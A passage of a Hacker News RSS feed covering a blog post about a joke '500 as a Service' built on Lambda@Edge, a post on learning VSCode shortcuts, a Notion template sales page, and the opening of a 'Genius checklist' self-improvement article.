<span>async</span> <span>function</span> <span>handleRequest</span><span>(</span><span>request</span><span>)</span> <span>{</span>
  <span>const</span> <span>htmlBody</span> <span>=</span> <span>`
&lt;html&gt;
    &lt;head&gt;
        &lt;title&gt;500 - Internal Server Error&lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;h1&gt;500&lt;/h1&gt;
        &lt;h2&gt;Internal Server Error&lt;/h2&gt;
    &lt;/body&gt;
&lt;/html&gt;
`</span><span>;</span>
  <span>return</span> <span>new</span> <span>Response</span><span>(</span><span>htmlBody</span><span>,</span> <span>{</span>
    <span>status</span><span>:</span> <span>500</span><span>,</span>
    <span>headers</span><span>:</span> <span>{</span> <span>'</span><span>content-type</span><span>'</span><span>:</span> <span>'</span><span>text/html</span><span>'</span> <span>},</span>
  <span>});</span>
<span>}</span>
</code></pre></div></div> <p>Deploying it was easy too. The problem came shortly after when I tried to add my new Worker URL to my AWS Route53 DNS records so that I could use the 500asaservice.com domain for it. The bad news is that Cloudflare won’t allow you to do this, unless you pay them a shed load of money. So that was the end of my adventure with Cloudflare Workers. At this point I decided to return to AWS to see what they could do for me. And easy enough, they have something pretty similar to Cloudflare Workers. It’s called Lambda@Edge and it allows you to run Lambda functions within CloudFront itself.</p> <p>With barely no changes to my original Lambda code, I set up a new CloudFront distribution. The origin for the distribution is inconsequential since every single response will be generated within the Lambda so I just gave it a made-up one. Then, all I had to do was to set up a CloudFront <code>viewer-request</code> event as the trigger for my Lambda and deploy the distribution. Once I got everything working, I encoded the configuration in a <code>serverless.yml</code> so it was easier to change and deploy. And that was pretty much it. I now have a Lambda function which runs atop Amazon’s ubiquitous and nearly infallible CDN. It costs me almost nothing to run it (provided it doesn’t start serving huge amounts of traffic) and requires no maintenance at all. I’m so confident of the performance and uptime (downtime?) of my application that I even published <a href="https://github.com/dvejmz/500aas#sla">an SLA for it</a>.</p> <p>There are still a couple of bugs in my application. Excuse me, bugs in an app that was built to fail? Yup, it turns out, 500aaS does not always return a HTTP 500 status code. It can still be susceptible to malformed HTTP requests, which will force CloudFront to step in and return a HTTP 400 error instead, bypassing the Lambda altogether (this is why my SLA does not promise 100% downtime). This is something I could perhaps fix by overriding the custom error responses CloudFront returns, but they seem to be set up as a function of the origin response, so I don’t know if they would work with Lambda@Edge. Still a work in progress.</p> <p>If you’re interested in checking out how 500aaS was built, you can browse the <a href="https://github.com/dvejmz/500aas">repository on GitHub</a>. Pull requests and suggestions welcome. I even set up a GitHub Actions pipeline to run a test to ensure it always fails. Because I have standards, you know?</p>  </div> </article>  </div></div>]]>
            </description>
            <link>https://sgfault.com/2020/05/03/500-aas.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25232171</guid>
            <pubDate>Fri, 27 Nov 2020 20:10:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Krakatoa skies: when the Sun turned blue (2017)]]>
            </title>
            <description>
<![CDATA[
Score 19 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25231935">thread link</a>) | @Thevet
<br/>
November 27, 2020 | https://www.volcanocafe.org/krakatoa-skies-when-the-sun-turned-blue/ | <a href="https://web.archive.org/web/*/https://www.volcanocafe.org/krakatoa-skies-when-the-sun-turned-blue/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://www.volcanocafe.org/krakatoa-skies-when-the-sun-turned-blue/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25231935</guid>
            <pubDate>Fri, 27 Nov 2020 19:40:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learning all VSCode shortcuts evolved my developing habits]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25231659">thread link</a>) | @tkainrad
<br/>
November 27, 2020 | https://tkainrad.dev/posts/learning-all-vscode-shortcuts-evolved-my-developing-habits/ | <a href="https://web.archive.org/web/*/https://tkainrad.dev/posts/learning-all-vscode-shortcuts-evolved-my-developing-habits/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="contentdiv">

<p>I spent a few hours spread over the last couple of weeks to learn every single one of VSCode’s keyboard shortcuts, specifically the 149 shortcuts from the <a href="https://code.visualstudio.com/shortcuts/keyboard-shortcuts-windows.pdf">official keyboard shortcuts reference</a>. These are also present in <a href="https://keycombiner.com/collections/vscode/">KeyCombiner’s searchable table of VSCode shortcuts</a>.</p>
<p>Admittedly, I started this challenge to write a blog post about it afterward and as a way to promote <a href="https://keycombiner.com/">KeyCombiner</a> via content marketing. The blog post I had in mind would be similar to my previous one, <a href="https://tkainrad.dev/posts/how-i-learned-50-new-keyboard-shortcuts-in-42-minutes/">documenting my process of learning 50 new web application shortcuts in 42 minutes</a>.</p>
<p>But, as it usually happens only in romantic comedies, my intentions changed over time. This article turned out much different. It is not about the learning process but about how this challenge changed some of the developing habits I had for many years. Workflows that I grew used to during many projects, different IDEs, and even varying programming languages suddenly evolved.</p>

<p>As software engineers, we like to think that we are continually learning and improving our skills. This is certainly true when it comes to the technologies we are using. However, our development habits, such as which features of our IDEs we use, are much more rigid. I believe most of our core workflows are formed early on and very hard to change.
I don’t have data to back this up, but when I look at myself, my co-workers, and other developers I know, this certainly seems true. If you think about it, it is not surprising, the same thing happens in other areas of life. For this very reason, you will find that developers who have studied or worked together will often use similar shortcuts, similar IDE features, and have similar limitations in their workflows.</p>
<p>The usual way to combat this is reading books, blog posts, attending conferences, well, everything that is used in our industry to extend our knowledge. However, with fundamental developing habits, I have found that this works poorly. You might read about a neat feature of your IDE, or see someone demo their workflow, but when you are eventually sitting in front of your screen and writing code, it is easy to fall back to what we already know, what is already set up, and proven to work.</p>
<p>After this experiment, I am convinced that keyboard shortcuts are the main factor in how we form our developing habits, and they can also stop us from evolving our habits.
Even before this challenge, I felt that I was good with shortcuts. I knew quite a few refactoring shortcuts, knew how to pause and stop program executing during debugging, was decent at jumping around between files, searching through my project, and all the other usual stuff. When I saw a co-worker using a shortcut that I didn’t know, I was quick to incorporate it into my workflow, too. After all, I was enough into shortcuts that I built a whole side-project around learning them.
<strong>The thing is, all new shortcuts that I learned were the ones that would augment my existing habits.</strong></p>
<p>This is a hen and egg problem; if you don’t know the shortcuts, you will not start to change your habits and use new IDE features because without shortcuts, they are too tedious to use or not at all usable. But if you don’t form new habits, you will not learn the shortcuts.</p>
<p><strong>Without intending it, I think I found a way to break out of this cycle:
Learning all IDE shortcuts very well <em>before</em> getting back to work. By learning <em>all</em> shortcuts, you are not limited to what somebody shows you and might not be compatible with your situation. You can naturally include what makes sense, in addition to your existing skills.</strong></p>
<p>The next section shows how this worked for me.</p>

<p>I started the learning process as it is usually done with KeyCombiner: By importing some shortcuts from the <a href="https://keycombiner.com/collections/vscode/">public collection of VSCode shortcuts</a> into a personal collection. Intuitively, I started with the ones I already knew and some additional that seemed most useful to me. Back then I was still trying to show that I could learn all shortcuts very quickly with KeyCombiner. I didn’t expect that shortcuts that had nothing to do with my existing workflows will be the real deal.</p>
<p>Some of the first combinations that I picked and that I did not know previously were <kbd>alt</kbd>+<kbd>w</kbd>/<kbd>r</kbd>/<kbd>c</kbd> for toggling find options (match whole word, regex, case sensitivity) because I was already using those features. This went on for a few days. I did a couple practice runs every day and added new shortcuts whenever KeyCombiner was saying that I mastered all of the previous ones.</p>
<p>Eventually, I knew all shortcuts that seemed useful for how I was using VSCode back then. So I had to start adding shortcuts that had nothing to do with my existing habits. This brought up an interesting misconception. Often keyboard shortcuts are seen as a way to do things faster, compared to using the mouse. While that is true, I think there is an even more aspect to shortcut usage in IDEs: Many features are not used at all, if you don’t know the shortcut!</p>
<p>As I was learning new VSCode shortcuts every day, I started to use features that I previously didn’t even know of. One of the first things that suddenly made a lot of sense was <em>Select all Occurences of Find Match</em> with <kbd>Alt</kbd>+<kbd>Enter</kbd> as default binding, especially when combined with regex search. I was so excited about it, that I even <a href="https://twitter.com/ThomasKainrad/status/1305608337799761920">tweeted a Gif</a> showing how I use it to modify the CSV files that are the source for KeyCombiner’s public collection tables.</p>
<p>The process worked both ways: Sometimes, while I was practicing a shortcut on KeyCombiner, it seemed apparent that this was useful and that I should include it into my workflow. Sometimes it hit me while coding that I had just learned a shortcut that can make the current task more efficient.</p>
<p>In the following, I describe the most significant changes in my daily development habits. The list is far from complete though; there are many more small things that I picked up and frequently use now.</p>
<p><strong>Editor and Panel Management</strong><br>
Since knowing all the shortcuts to switch focus between panels and move editors around, I am using VSCode’s powerful layouting capabilities much more. I have 3-5 editor panels open at pretty much all times, seeing many related pieces of code at once. Working this way by using the mouse is very impractical.
I switch between editor panels with keyboard shortcuts and move editors from one group to the other.</p>
<p>There is one negative side-effect, though: I am starting to get annoyed when I use other IDEs (PyCharm, Eclipse), because they lack far behind VSCode when it comes to using multiple editors.</p>
<p><strong>Multi-cursor Editing</strong><br>
If you don’t know the shortcut to add additional cursors, I doubt you will ever use this incredibly powerful feature of VSCode. It is a typical feature that only blends into your habits once you know the shortcuts.
The basic commands are <kbd>Ctrl</kbd>+<kbd>Ctrl</kbd>+<kbd>Down</kbd>/<kbd>Up</kbd> for adding cursors above/below. However, I found the commands to <em>Insert cursor at end of each line selected</em> (<kbd>Shift</kbd>+<kbd>Alt</kbd>+<kbd>i</kbd>), and the above-mentioned <em>Select all Occurences of Find Match</em> (<kbd>Alt</kbd>+<kbd>Enter</kbd>) even more powerful. These commands are why I frequently paste text snippets into VSCode, apply a few operations, and then copy-paste it back into whatever application I was using.</p>
<p><strong>Opening views by shortcut</strong><br>
I sometimes tried to do this before, but it never stuck. Now I finally switch to all views (Explorer, Debug, Search, Problems, etc.) with dedicated keyboard shortcuts. These shortcuts translate very nicely to other IDEs. After learning the VSCode default bindings, which are <kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>&lt;char&gt;</kbd>, I set the same bindings also for Eclipse and PyCharm. Especially <kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>e</kbd> for switching to the explorer view and <kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>d</kbd> for switching to the debug view are among my most used shortcuts now.</p>
<p><strong>Making Selections</strong><br>
I hate to admit it, but I did not use shortcuts to expand and shrink AST selections before. AST stands for <em>abstract syntax tree</em>, which means that the IDE will take the current language’s syntax into account for modifying the selection. Finally, I picked up <kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>left</kbd>/<kbd>right</kbd> to shrink and expand selections. Not all IDEs handle this in the same way, which can be a bit annoying, but it works well for the most frequent tasks, such as expanding the selection to enclose the current string, method, class, or HTML tag.</p>
<p><strong>Folding</strong><br>
I have started to use folding much more. For years, I have rarely used this feature that all IDEs support to a great extent. Now, I do it frequently. Folding is one of these things that are just not feasible with the mouse. Of course, if you need to fold code, <a href="https://blog.codinghorror.com/the-problem-with-code-folding/">chances are that you need to structure your code better</a>. Many organizations even apply automatic code linters that will complain when methods or classes are too long. However, I have never seen someone recommend splitting up blog posts into multiple files. The same goes for other non-code file types, such as JSON. All we have there is folding.</p>
<p>I am not saying these are the things you should start to learn now, far from it. These are the things I personally integrated deep into my workflows after doing this challenge, without choosing them deliberately, but naturally. Who knows what you will pick up.</p>
<p>Of course, some of the shortcuts I learned still seem a bit, let’s say nonessential, but a little useless knowledge never killed nobody.</p>

<p>In addition to finally breaking out of old habits and experience a real evolution of my IDE usage, there were some additional, less significant, but still delightful second-order effects.</p>
<p>As a shortcut enthusiast, I often had the problem that I needed to decide which binding to use for a particular operation and application pair. KeyCombiner’s public shortcut search helps to find out which binding is the convention for a particular operation, but it can still be tricky. For example, take the frequently used <em>Step Over</em> operation used for debugging. <a href="https://keycombiner.com/collecting/collections/public/search/?description=step+over&amp;keys=&amp;mac_keys=&amp;submit=Search">KeyCombiner shows that VSCode, Eclipse, and JetBrains IDEs all use a different default binding</a>(<kbd>F6</kbd>,<kbd>F8</kbd>,<kbd>F10</kbd>). Learning every single VSCode shortcut has freed me from this mental load of deciding what the best …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://tkainrad.dev/posts/learning-all-vscode-shortcuts-evolved-my-developing-habits/">https://tkainrad.dev/posts/learning-all-vscode-shortcuts-evolved-my-developing-habits/</a></em></p>]]>
            </description>
            <link>https://tkainrad.dev/posts/learning-all-vscode-shortcuts-evolved-my-developing-habits/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25231659</guid>
            <pubDate>Fri, 27 Nov 2020 19:07:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Notion Workspace for Freelancers, Consultants and Entrepreneurs]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25231337">thread link</a>) | @saviorand
<br/>
November 27, 2020 | https://optemization.com/entrepreneur-os | <a href="https://web.archive.org/web/*/https://optemization.com/entrepreneur-os">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><article id="block-entrepreneur-os"><blockquote id="block-162e7b30e18a4fc998ab90f0b9a96614"><span><span><strong>Let's be honest — you don't have the time.
 
</strong></span><span>Tons of data plus missing context equals sub-optimal results. 
Wouldn't it be great to have </span><span><strong>a single place</strong></span><span> to manage all your </span><span><strong>tasks</strong></span><span>, </span><span><strong>meetings </strong></span><span>and </span><span><strong>documents</strong></span><span>, </span><span><strong>automate </strong></span><span>the routine and get a clear picture of what's important?

That's Entrepreneur OS.
A ready-made, pre-designed Notion template </span></span></blockquote><div id="block-38d5e0d068bf4161a57a2b7025f725a8"><div id="block-2e342843e3e24726829fdb7cf499b62f"><div id="block-7370490dc33f49eab2e55627c50c66e8"><picture><source srcset="https://api.super.so/asset/optemization.com/14286e05-025f-4a0e-9c64-3c1f791d97b7.png?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/14286e05-025f-4a0e-9c64-3c1f791d97b7.png?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/14286e05-025f-4a0e-9c64-3c1f791d97b7.png?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/14286e05-025f-4a0e-9c64-3c1f791d97b7.png?w=1500" alt="image" loading="lazy"></picture></div></div><div id="block-dab238dd28334bb98739d9a0ee6bde51"><h3 id="block-5428eb9841c8411aac610d7a78706af9"><span id="5428eb9841c8411aac610d7a78706af9"></span><span><span>
A Single Source of Truth</span></span></h3><p><span><span>Never scrap your notes across the workspace again — all the data is stored in one of </span><span><strong>23 databases</strong></span><span>.</span></span></p></div></div><div id="block-3f2a4abda959455d9eb348618d7dc6f3"><div id="block-de99952a21f84383ac32235499efa57b"><h3 id="block-7bd5d10b269b4627b62802b492a506ad"><span id="7bd5d10b269b4627b62802b492a506ad"></span><span><span>
Powerful dashboards</span></span></h3><p><span><span>Get an overview of what matters with any one out of </span><span><strong>10 available dashboards</strong></span><span>. Mix and match to get your personal one.</span></span></p></div><div id="block-86ec09a4fe1b4b1792d75a092f466c27"><div id="block-25d4adf779814130b4007626904b5517"><picture><source srcset="https://api.super.so/asset/optemization.com/e1a1f19c-4d14-4483-898c-2aec5e8fd0d2.png?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/e1a1f19c-4d14-4483-898c-2aec5e8fd0d2.png?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/e1a1f19c-4d14-4483-898c-2aec5e8fd0d2.png?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/e1a1f19c-4d14-4483-898c-2aec5e8fd0d2.png?w=1500" alt="image" loading="lazy"></picture></div></div></div><div id="block-5a3141e656c3478ba2b452b110b58291"><div id="block-d9e763f1c9ba4b8cab0527a179052f6a"><div id="block-5f1235a694814092b151394ba34863e2"><picture><source srcset="https://api.super.so/asset/optemization.com/133166a2-88c3-492c-b8cb-99df59f6ac19.png?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/133166a2-88c3-492c-b8cb-99df59f6ac19.png?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/133166a2-88c3-492c-b8cb-99df59f6ac19.png?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/133166a2-88c3-492c-b8cb-99df59f6ac19.png?w=1500" alt="image" loading="lazy"></picture></div></div><div id="block-379707fa04874765b77667e013cef745"><h3 id="block-f3805050188347f88494ca3bf0043223"><span id="f3805050188347f88494ca3bf0043223"></span><span><span>
Every use case imaginable</span></span></h3><p><span><span><strong>53 templates </strong></span><span>complete with client proposals and hubs for internal work. Track meetings, make decisions, plan for the future — and 46 more things</span></span></p></div></div><div id="block-8ab98af4feb547258389cb1b8d81387c"><div id="block-0990bff76a1f4decb36ea999794739a0"><h3 id="block-6cd91b6ea6424f7983eec6e870bffea6"><span id="6cd91b6ea6424f7983eec6e870bffea6"></span><span><span>
Set up for scale</span></span></h3><p><span><span>Database-packed back-end, intuitive front-end and a connected structure make the OS future-proof, so you can focus on growth</span></span></p></div><div id="block-e86f2be1e6b541fda9b02a2c206ca0f4"><div id="block-d2ccc44cf98340a4a0db4def9b98ca04"><picture><source srcset="https://api.super.so/asset/optemization.com/c9d3d94e-a635-4fc3-9ce6-c7af14f3b747.png?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/c9d3d94e-a635-4fc3-9ce6-c7af14f3b747.png?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/c9d3d94e-a635-4fc3-9ce6-c7af14f3b747.png?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/c9d3d94e-a635-4fc3-9ce6-c7af14f3b747.png?w=1500" alt="image" loading="lazy"></picture></div></div></div><div id="block-840550dcb69f40fd83ec833b3c312b50"><picture><source srcset="https://api.super.so/asset/optemization.com/3305547f-320f-49c9-bdc1-ee999f23ae79.png?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/3305547f-320f-49c9-bdc1-ee999f23ae79.png?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/3305547f-320f-49c9-bdc1-ee999f23ae79.png?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/3305547f-320f-49c9-bdc1-ee999f23ae79.png?w=1500" alt="Example client dashboard" loading="lazy"></picture><figcaption><span><span>Example client dashboard</span></span></figcaption></div><h3 id="block-92a5ef678c854dd088ee29e5721b7740"><span id="92a5ef678c854dd088ee29e5721b7740"></span><span><span>Keep your clients in the loop — and happy — with automated proposals, a shareable project hub, and a templated schedule</span></span></h3><div id="block-cef8d1737f264eccadb1ad72d8c2a0c6"><picture><source srcset="https://api.super.so/asset/optemization.com/d577f317-c976-411c-96e7-837701417ead.png?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/d577f317-c976-411c-96e7-837701417ead.png?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/d577f317-c976-411c-96e7-837701417ead.png?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/d577f317-c976-411c-96e7-837701417ead.png?w=1500" alt="Personal weekly dashboard" loading="lazy"></picture><figcaption><span><span>Personal weekly dashboard</span></span></figcaption></div><h3 id="block-3252ef1a13cd46a5bf98044a92e3e5a0"><span id="3252ef1a13cd46a5bf98044a92e3e5a0"></span><span><span>Daily and weekly tasks, meetings, notes and decisions </span></span></h3><div id="block-7bdb3ce99b21455f8beef08d07aa63ae"><picture><source srcset="https://api.super.so/asset/optemization.com/96ebece8-4ced-4d9f-a9e1-ee48d9f791e4.png?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/96ebece8-4ced-4d9f-a9e1-ee48d9f791e4.png?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/96ebece8-4ced-4d9f-a9e1-ee48d9f791e4.png?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/96ebece8-4ced-4d9f-a9e1-ee48d9f791e4.png?w=1500" alt="Marketing Dashboard" loading="lazy"></picture><figcaption><span><span>Marketing Dashboard</span></span></figcaption></div><h3 id="block-49f29f5072264e1a95a623ef6d4a581e"><span id="49f29f5072264e1a95a623ef6d4a581e"></span><span><span>Content editorial, mentions, marketing schedule — seamless and insightful</span></span></h3><blockquote id="block-a257ba054dfc44d1866ee63703f51fdb"><span><span><strong>Entrepreneur OS</strong></span><span> costs $99. This includes:
 - All databases and views, a set of dashboards for client and project work, sales, marketing, business development  
 - A library to with filtered views to quickly assemble your own dashboards
 - A schema and a back-end allowing to easily transform the data structure and introduce new databases</span></span></blockquote></article></div></div></div>]]>
            </description>
            <link>https://optemization.com/entrepreneur-os</link>
            <guid isPermaLink="false">hacker-news-small-sites-25231337</guid>
            <pubDate>Fri, 27 Nov 2020 18:29:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Genius Checklist]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25229772">thread link</a>) | @joubert
<br/>
November 27, 2020 | https://supermemo.guru/wiki/Genius_checklist | <a href="https://web.archive.org/web/*/https://supermemo.guru/wiki/Genius_checklist">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="mw-content-text" lang="en" dir="ltr"><p><small>This article by Dr <a href="https://supermemo.guru/wiki/Piotr_Wozniak" title="Piotr Wozniak">Piotr Wozniak</a> is part of <a href="https://supermemo.guru/wiki/SuperMemo_Guru" title="SuperMemo Guru">SuperMemo Guru</a> series on memory, learning, creativity, and problem solving.</small>
</p>


<p><small>Compiled on the basis of the original list presented here: <i><a href="http://super-memory.com/articles/genius.htm">Roots of genius and creativity</a></i>, <a href="https://supermemo.guru/wiki/Piotr_Wozniak" title="Piotr Wozniak">Piotr Wozniak</a> (2001)</small>
</p>
<h2><span id="How_to_become_a_genius">How to become a genius</span></h2>
<p>A majority of people carry the potential to become a genius. There are factors that are far <a href="https://supermemo.guru/wiki/Simple_formula_for_high_intelligence" title="Simple formula for high intelligence">more important than genes and IQ</a>. I have compiled a checklist that I believe should work, when followed. All you need to begin with is to be free and reasonably healthy. I try to list the factors that prevent many people from accomplishing their greatest potential. The list begins with the stumbling blocks that are most likely to occur on one's road to genius. Some factors need to be balanced against each other, and some factors overlap. For example, the first three preconditions of genius are strongly related: freedom from <a href="https://supermemo.guru/wiki/Stress_resilience" title="Stress resilience">stress</a>, <a href="https://supermemo.guru/wiki/Science_of_sleep" title="Science of sleep">good sleep</a>, and <a href="https://supermemo.guru/wiki/Self-discipline" title="Self-discipline">self-discipline</a>. They may provide the key to answering why we are not (yet) a planet of geniuses. I listed individual points separately on the basis of their ability to motivate and inspire. Before you start reading, however, remember what Herbert Simon said about genius: it takes about ten years to develop it. Not only will you have to meet all the criteria listed below, but lots of hard work and patience will be required before you climb that summit!
</p>
<p>If you follow these rules religiously, you will be amazed by how much progress you can make in a decade</p> 
<p>If I scare you with a decade-long time-frame, remember that chances are good that you will love your self-transformation in weeks. The younger you are, the 'messier' your life, the less you know about your future, the more powerful the effect.
</p>
<h3><span id="Eliminate_stress">Eliminate stress</span></h3>
<p>Stress is understood here as rapid change resulting in an increase in stress hormones (catecholamines, ACTH, cortisol, etc.). Stressful change can come from conflict, illness, the death of a relative, or unemployment. Stress can also result from seemingly happy events such as a wedding or a hasty vacation. A simple test here is to make sure that creative problems circulate in your mind while you are brushing your teeth. You will fail the test if, instead of creative thinking, you are preoccupied with problems at work or in the family. Stress will dramatically cut down your creative efficiency. Most of all, it will affect your <a href="https://supermemo.guru/wiki/Self-discipline" title="Self-discipline">self-discipline</a>: another cornerstone of genius. In addition, <a href="https://supermemo.guru/wiki/Chronic_stress" title="Chronic stress">chronic stress</a> will result in excess cortisol, increased activity in the sympathetic system, and a resulting inhibition of neurogenesis, memory consolidation, creativity, and more. See: <a href="https://supermemo.guru/wiki/Stress_resilience" title="Stress resilience">Stress resilience</a>
</p>
<h3><span id="Sleep">Sleep</span></h3>
<p>Make sure to always get as much quality sleep as <a href="https://supermemo.guru/wiki/Free_running_sleep" title="Free running sleep">your brain requires</a>. The simplest first step is: <a href="https://supermemo.guru/wiki/Kill_the_alarm_clock" title="Kill the alarm clock">throw away your alarm clock</a>! Lack of sleep delivers a quadruple whammy: (1) it suppresses memory consolidation, (2) it prevents <a href="https://supermemo.guru/wiki/Memory_optimization_in_sleep" title="Memory optimization in sleep">memory optimization</a>, (3) it makes you unwilling to exert mental effort, and (4) it undermines your <a href="https://supermemo.guru/wiki/Self-discipline" title="Self-discipline">self-discipline</a>. Submit to the <a href="https://supermemo.guru/wiki/Natural_creativity_cycle" title="Natural creativity cycle">natural creativity cycle</a>. For more see: <a href="https://supermemo.guru/wiki/Science_of_sleep" title="Science of sleep">Science of sleep</a>
</p>
<h3><span id="Self-discipline">Self-discipline</span></h3>
<p>Lack of self-discipline aggravated by stress and a lack of sleep is the number one cause of low productivity. The trick to achieving good self-discipline is to make incremental progress, and convert discipline into a habit and then into the pleasure of productivity (for more see: <a href="https://supermemo.guru/wiki/Self-discipline" title="Self-discipline">Self-discipline</a>).
If you develop healthy self-discipline habits early, your life is likely to take an entirely different course. If you believe you are lacking in this field, try the following exercise: as soon as a valuable activity comes to your mind that you are really unwilling to do, <b>do it</b>. Within the scope and in agreement with human biology, your rational brain must be the master of your decision making. Stand over a pool of cold water. Do you hate jumping in? The more you hate it, the sooner you should jump. And in the end you will <a href="https://supermemo.guru/wiki/Winter_swimming" title="Winter swimming">love it</a>. A cold shower is a minor inconvenience once you experience the volitional power of the brain. You need to master the skill of perfect execution of your own plans. The more precise your plan, the harder it is to execute, yet the more tangible the results. Learn to delay gratification. If you focus on your long-term goals, your daily inconveniences will be more bearable or even pleasurable. A strenuous quest towards the goal is the best reward for a genius mind. Minor awards of laziness do not befit a true genius. Think of self-discipline daily. Even the strongest minds can relax it all too easily. Remember about stress and sleep. Stress and sleepiness are chief factors that undermine self-discipline. Self-discipline cannot quarrel with biology. In extreme cases, it can actually <a href="https://supermemo.guru/wiki/War_of_the_networks" title="War of the networks">undermine your genius</a>. If you are sick, stop working. If you are sleepy, go to sleep. For comfort, you should know, that with each passing year, self-discipline will gradually transform into a pleasure. Not only will you <a href="https://supermemo.guru/wiki/Plan" title="Plan">execute your plans instinctively</a>, you will also reap the benefits of your earlier efforts to steer your life in a good direction. In later years, you will not need much self-discipline to employ your genius mind to do good things.
</p>
<h3><span id="Learn_day_and_night">Learn day and night</span></h3>
<p>Knowledge is the substance you <a href="https://supermemo.guru/wiki/How_to_solve_any_problem%3F" title="How to solve any problem?">convert to great ideas</a>. Although it is possible to learn in stress or in a <a href="https://supermemo.guru/wiki/Sleep_deprivation" title="Sleep deprivation">sleep deficit</a>, learning is listed here behind stress, sleep and self-discipline. This is because humans exhibit <a href="https://supermemo.guru/wiki/Learn_drive" title="Learn drive">inborn curiosity</a> that makes them crave learning. TV, tabloid press, and social media thrive on this need for learning. Most people understand the importance of learning but are prevented from executing their plans due to stress, lack of sleep or lack of self-discipline. To breed genius, your whole life should revolve around learning. You should use every single little opportunity to learn important things. This could be reading Einstein's biography or talking with a homeless person. Read, talk, watch, surf, and keep on thinking. Do not avoid hard subjects (e.g. mathematics). Mold your learning strictly to your creative needs, but do not fail to explore a wide range of topics. Touch all the bases and avoid tunnel vision! Remember that your success in learning will require appropriate <a href="https://supermemo.guru/wiki/20_rules" title="20 rules">knowledge representation</a> and timing of review (as in <a href="https://supermemo.guru/wiki/SuperMemo" title="SuperMemo">SuperMemo</a>). Are you lacking a university education? <a href="https://supermemo.guru/wiki/School_dropouts" title="School dropouts">Never mind</a>. Look at Edison, Lincoln, or Leibnitz to see the power of <a href="https://supermemo.guru/wiki/Self-learning" title="Self-learning">self-instruction</a>. All the seemingly contradictory requirements listed above can be reconciled if you structure your learning with <a href="https://supermemo.guru/wiki/Incremental_reading" title="Incremental reading">incremental reading</a>. See: <a href="https://supermemo.guru/wiki/Advantages_of_incremental_reading" title="Advantages of incremental reading">Advantages of incremental reading</a>
</p>
<h3><span id="Abstract_knowledge">Abstract knowledge</span></h3>
<p>Except for a great deal of learning, you will need to pay attention to the <a href="https://supermemo.guru/wiki/Abstract_knowledge" title="Abstract knowledge">quality of knowledge</a> and its general <a href="https://supermemo.guru/wiki/Applicability" title="Applicability">applicability</a>. You cannot just memorize thousands of facts. You have to consciously explore areas such as logic, probability, statistics, game theory, decision theory, computing sciences, optimization, as well as other branches of mathematics and sciences. You have to develop a love for logical thinking, the scientific method, and skepticism. Even if you are a movie critic, you will still need quality logic to frame your judgment. Remember that all knowledge is volatile and may be subject to falsification at any time. Keep your mind open to new truths even if they seem to turn your present vision of the world upside down
</p>
<h3><span id="Knowledge_representation">Knowledge representation</span></h3>
